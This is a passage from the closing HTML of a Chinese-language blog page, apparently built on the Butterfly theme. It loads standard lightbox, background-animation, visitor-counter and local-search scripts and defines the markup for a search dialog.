src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
